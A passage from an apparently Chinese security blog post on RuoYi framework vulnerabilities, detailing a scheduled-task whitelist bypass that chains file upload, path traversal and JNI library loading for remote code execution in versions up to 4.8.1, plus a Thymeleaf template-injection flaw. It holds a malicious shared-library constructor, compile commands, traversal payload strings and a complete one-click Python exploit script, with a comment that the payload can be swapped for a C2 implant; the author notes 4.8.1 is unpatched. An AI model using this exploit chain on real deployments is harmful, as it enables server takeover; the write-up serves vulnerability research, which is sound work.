+<h1 id="-5"><a href="#-5" class="headerlink" title="&lt;&#x3D;4.8.1-定时任务绕过&amp;文件上传&amp;JNI"></a>&lt;&#x3D;4.8.1-定时任务绕过&amp;文件上传&amp;JNI</h1><h2 id="漏洞发现-4"><a href="#漏洞发现-4" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>这里的利用思路还是很巧妙的，先解释一些总体思路。</p>
+<p>计划任务创建时，使用了黑名单+白名单。我们无法使用黑名单里的类，但是可以想办法让白名单的范围扩大。白名单原本是com.ruoyi.quartz.task，作者的本意是只能调用这个包里的类。但是，白名单匹配时，使用的是contains，也就是说，只要定时任务里有白名单的字符串就行了。这就给了我们绕过的机会。</p>
+<p>Java中有一种JNI机制，可以加载外部的链接库，并加载里面的构造函数。</p>
+<p>我们可以上传一个JNI文件，JNI文件名包含com.ruoyi.quartz.task，再通过定时任务更改文件后缀，再通过定时任务调用类去加载JNI文件。由于JNI文件名包含了白名单内容，所以可以绕过白名单，实现RCE。上传后又可以通过定时任务更改文件后缀，这样就可以加载JNI文件了。</p>
+<p>现在来看细节。</p>
+<p>在白名单过滤时，当包名超过一层时，就会进入全限定名的if，而不是bean的if：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142481228.png"  alt="img"></p>
+<p>这样只需要满足定时任务中包含白名单字符串即可。</p>
+<p>定时任务的触发逻辑在com.ruoyi.quartz.util.JobInvokeUtil，里面的getMethodParams用于获取执行参数，具体如下：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142481234.png"  alt="img"></p>
+<p>能够看出，这里能够接受的参数只有：String，boolean，long，double，以及能够被转换成Integer的类。所以在参数方法，我们的选择是是否有限的。</p>
+<p>另外，invokeMethod时，我们只能调用public方法：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142481225.png"  alt="img"></p>
+<p>综上，我们的条件是：</p>
+<p>1、调用的类及参数不能包含黑名单的字符串</p>
+<p>2、调用的类及参数一定要包含白名单的字符串</p>
+<p>3、调用的参数类型有限制</p>
+<p>4、调用的方法只能是public方法</p>
+<p>另外，我们可以进行文件上传：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142481244.png"  alt="img"></p>
+<p>会返回上传的位置：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142481230.png"  alt="img"></p>
+<h2 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1、编译c文件，windows编译成dll，mac编译成dylib，linux编译成.so</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gcc -shared -o evil.dll evil.c	需要MinGW</p>
+<p>gcc -fPIC -shared -o evil.so evil.c</p>
+<p>gcc -dynamiclib -o evil.dylib evil.c</p>
+<p>将编译后的文件重命名为：com.ruoyi.quartz.task.dll.txt</p>
+<p>2、利用python脚本发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:4800/common/upload&quot;</span></span><br><span class="line"><span class="comment"># 准备上传的文件内容</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;com.ruoyi.quartz.task.dll.txt&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;com.ruoyi.quartz.task.dll.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=5324115e-f2e1-4021-ab71-fbe64ddfff3e&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置代理，HTTP 和 HTTPS 都指向 Burp 的监听地址</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url, files=files, proxies=proxies, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+
+<p>代理部分可以去掉</p>
+<p>记录文件路径：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142517248.png"  alt="img"></p>
+<p>这里的路径不完全正确，如果没有重新设置过文件上传路径，windows系统应该在”D:\ruoyi\uploadPath\upload”，后面再拼接日期等。</p>
+<p>如果修改过配置文件中的上传路径，就得猜测路径了。</p>
+<p>猜测的话可以搭配<code>ch.qos.logback.core.FileAppender.openFile</code> 使用  因为会默认创建一个空文件 猜测前缀即可</p>
+<p><code>ch.qos.logback.core.FileAppender.openFile</code>(‘前缀+&#x2F;uploadPath&#x2F;download&#x2F;com.ruoyi.quartz.task.log’) 之后访问&#x2F;profile&#x2F;前缀+&#x2F;uploadPath&#x2F;download&#x2F;com.ruoyi.quartz.task.log 来判断</p>
+<p>3、设置定时任务并执行修改文件后缀为dll</p>
+<p>ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004.txt”,”..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004.dll”)</p>
+<p>4、定时任务加载dll文件</p>
+<p>com.sun.glass.utils.NativeLibLoader.loadLibrary(“..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ruoyi&#x2F;uploadPath&#x2F;upload&#x2F;2025&#x2F;08&#x2F;01&#x2F;com.ruoyi.quartz.task.dll_20250801153101A004”)</p>
+<p>下面是一键python脚本，只适用于windows，且没有更改过默认文件上传路径的情况，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改为目标url</span></span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:4810&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记得替换cookie</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;JSESSIONID=ef41ab5c-d8b4-4802-a8a7-0928c67b91e3;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置代理，HTTP 和 HTTPS 都指向 Burp 的监听地址</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fileUpload</span>():</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/common/upload&quot;</span></span><br><span class="line">    file = <span class="string">&quot;com.ruoyi.quartz.task.txt&quot;</span></span><br><span class="line">    <span class="comment"># 此dll为windows下弹出计算器，可自行更改，可配合C2</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">f&#x27;<span class="subst">&#123;file&#125;</span>&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;calc.dll&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.post(url, files=files, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(resp.text)</span><br><span class="line">    <span class="comment"># 自动获取上传后的文件名</span></span><br><span class="line">    fileName_txt = json.loads(resp.text)[<span class="string">&quot;fileName&quot;</span>].replace(<span class="string">&#x27;/profile/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    fileName_dll = fileName_txt.replace(<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.dll&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fileName_txt, fileName_dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jobsRemove</span>():</span><br><span class="line">    <span class="comment"># 删除已存在的任务</span></span><br><span class="line">    burp0_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/monitor/job/remove&quot;</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;ids&quot;</span>: <span class="string">&quot;114,514&quot;</span>&#125;</span><br><span class="line">    resp = requests.post(burp0_url, headers=headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;任务删除情况：&quot;</span> + resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jobExtensionCreate</span>(<span class="params">fileName_txt, fileName_dll</span>):</span><br><span class="line">    burp0_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/monitor/job/add&quot;</span></span><br><span class="line">    <span class="comment"># Windows默认路径情况；若更改过文件上传路径，则需要猜测路径前缀</span></span><br><span class="line">    finalFileName_txt = <span class="string">f&quot;../../../../../../../../../../../../../ruoyi/uploadPath/<span class="subst">&#123;fileName_txt&#125;</span>&quot;</span></span><br><span class="line">    finalFileName_dll = <span class="string">f&quot;../../../../../../../../../../../../ruoyi/uploadPath/<span class="subst">&#123;fileName_dll&#125;</span>&quot;</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;jobId&quot;</span>: <span class="string">&quot;114&quot;</span>, <span class="string">&quot;createBy&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;jobName&quot;</span>: <span class="string">&quot;ExtensionToDll&quot;</span>, <span class="string">&quot;jobGroup&quot;</span>: <span class="string">&quot;DEFAULT&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;invokeTarget&quot;</span>: <span class="string">f&quot;ch.qos.logback.core.rolling.helper.RenameUtil.renameByCopying(\&quot;<span class="subst">&#123;finalFileName_txt&#125;</span>\&quot;,&quot;</span></span><br><span class="line">                                  <span class="string">f&quot;\&quot;<span class="subst">&#123;finalFileName_dll&#125;</span>\&quot;)&quot;</span>, <span class="string">&quot;cronExpression&quot;</span>: <span class="string">&quot;* * * * * ?&quot;</span>, <span class="string">&quot;misfirePolicy&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;concurrent&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;remark&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    resp = requests.post(burp0_url, headers=headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;修改扩展名任务创建情况：&quot;</span>  + resp.text)</span><br><span class="line">    <span class="keyword">return</span> finalFileName_dll</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jobExtensionRun</span>():</span><br><span class="line">    burp0_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/monitor/job/run&quot;</span></span><br><span class="line">    <span class="comment"># 跟上面的jobId保持一致</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;jobId&quot;</span>: <span class="string">&quot;114&quot;</span>&#125;</span><br><span class="line">    resp = requests.post(burp0_url, headers=headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;修改扩展名任务执行情况：&quot;</span> + resp.text)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jobJniCreate</span>(<span class="params">finalFileName_dll</span>):</span><br><span class="line">    <span class="comment"># 去掉扩展名</span></span><br><span class="line">    finalFileName = finalFileName_dll[:<span class="built_in">len</span>(finalFileName_dll)-<span class="number">4</span>:]</span><br><span class="line">    burp0_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/monitor/job/add&quot;</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;jobId&quot;</span>: <span class="string">&quot;514&quot;</span>, <span class="string">&quot;createBy&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;jobName&quot;</span>: <span class="string">&quot;JNILoader&quot;</span>, <span class="string">&quot;jobGroup&quot;</span>: <span class="string">&quot;DEFAULT&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;invokeTarget&quot;</span>: <span class="string">f&quot;com.sun.glass.utils.NativeLibLoader.loadLibrary(\&quot;<span class="subst">&#123;finalFileName&#125;</span>\&quot;)&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;cronExpression&quot;</span>: <span class="string">&quot;* * * * * ?&quot;</span>, <span class="string">&quot;misfirePolicy&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;concurrent&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;remark&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    resp = requests.post(burp0_url, headers=headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;jni任务创建情况：&quot;</span> + resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jobJniRun</span>():</span><br><span class="line">    burp0_url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/monitor/job/run&quot;</span></span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;jobId&quot;</span>: <span class="string">&quot;514&quot;</span>&#125;</span><br><span class="line">    resp = requests.post(burp0_url, headers=headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;jni任务运行情况：&quot;</span> + resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    s = <span class="string">&quot;12345678&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s[:<span class="built_in">len</span>(s)-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># test()</span></span><br><span class="line">    fileNames = fileUpload()</span><br><span class="line">    jobsRemove()</span><br><span class="line">    finalFileName_dll = jobExtensionCreate(fileNames[<span class="number">0</span>], fileNames[<span class="number">1</span>])</span><br><span class="line">    jobExtensionRun()</span><br><span class="line">    jobJniCreate(finalFileName_dll)</span><br><span class="line">    jobJniRun()</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h2><p>最新的4.8.1版本还未修复。</p>
+<p>我感觉把那个JNI加载的类加入定时任务黑名单就好了。同时把白名单改成com.xxx开头。</p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   target="_blank" rel="noopener" href="https://cn-sec.com/archives/3993784.html" >【安全研究】若依4.8.0版本计划任务RCE研究<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="-6"><a href="#-6" class="headerlink" title="&lt;&#x3D;4.7.1-SSTI"></a>&lt;&#x3D;4.7.1-SSTI</h1><h2 id="漏洞发现-5"><a href="#漏洞发现-5" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>在进行模板渲染时，对fragment进行了直接拼接，导致可以执行表达式注入：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142528369.png"  alt="img"></p>
+<h2 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>${T()}不行，T必须与()之间有空格，这是为了绕过thymeleaf组件自带的防护。cacheName不能为空。</p>
+<p>直接发包即可：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142528373.png"  alt="img"></p>
+<p>dns也能成功：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142528383.png"  alt="img"></p>
+<p>一共四个路由存在漏洞：</p>
+<p>&#x2F;monitor&#x2F;cache&#x2F;getKeys</p>
+<p>&#x2F;monitor&#x2F;cache&#x2F;getNames</p>
+<p>&#x2F;monitor&#x2F;cache&#x2F;getValue</p>
+<p>&#x2F;demo&#x2F;form&#x2F;localrefresh&#x2F;task</p>
+<p>低版本前三个路由可能不存在，第四个路由在4.5.0版本存在，4.2.0版本不存在，中间版本未测试。</p>
+<p>存在这个，则前三个路由存在：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142536557.png"  alt="img"></p>
+<p>只要存在：</p>
+<p><img   src="/2025/05/03/JNI/%E6%9C%AC%E6%BC%8F%E6%B4%9E/image-1754142536570.png"  alt="img"></p>
+<p>则第四个路由存在。</p>
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>thymeleaf 3.0.12版本是存在漏洞的，所以在4.7.2升级成了3.0.15版本，修复了漏洞。</p>
+<h1 id="shiro相关"><a href="#shiro相关" class="headerlink" title="shiro相关"></a>shiro相关</h1><p>这个先不讲了，之后复习shiro的时候一起归类吧。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>1、4.7.8之前&#x2F;tool&#x2F;gen&#x2F;createTable都可以用来update，可以结合定时任务使用。定时任务中的黑名单可以在注入时使用16进制绕过。</p>
+<p>2、其他4.7.1–4.7.5和&lt;&#x3D;4.6.1的可以用来拖库</p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>1、可以通过jndi或者jni实现RCE，往往配合SQL注入</p>
+<p>2、可以修改配置文件，配合任意文件下载</p>
+<h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>1、&lt;&#x3D;4.7.8都能用，&lt;&#x3D;4.5.0可以直接用，高版本要配合定时任务</p>
+<h2 id="审计原则"><a href="#审计原则" class="headerlink" title="审计原则"></a>审计原则</h2><p>1、sql注入，mybatis的可以搜${</p>
+<p>2、文件上传，解压缩这种地方多注意，看看目录是否过滤或可控</p>
+<p>3、定时任务</p>
+<p>4、注意多种漏洞结合</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                若依各版本漏洞
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/08/02/若依各版本漏洞/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-08-02 21:39</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/08/02/WebGoat%E9%9D%B6%E5%9C%BA-XSS/"
+                                   title="WebGoat靶场-XSS"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">WebGoat靶场-XSS</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/28/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%AE%80%E8%BF%B0/"
+                                   title="开发框架简述"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">开发框架简述</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">&lt;&#x3D;4.2.0-Fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.3.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-1"><span class="nav-number">2.</span> <span class="nav-text">&lt;&#x3D;4.5.0-任意文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">2.1.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-2"><span class="nav-number">3.</span> <span class="nav-text">&lt;&#x3D;4.7.8-定时任务&amp;任意文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">3.3.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-3"><span class="nav-number">4.</span> <span class="nav-text">&lt;&#x3D;4.6.1-SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-2"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-7-1-4-7-8-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">4.7.1-4.7.8-SQL注入+绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">5.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#-4"><span class="nav-number">6.</span> <span class="nav-text">&lt;&#x3D;4.7.8-定时任务SQL&amp;RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-3"><span class="nav-number">6.1.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-2"><a 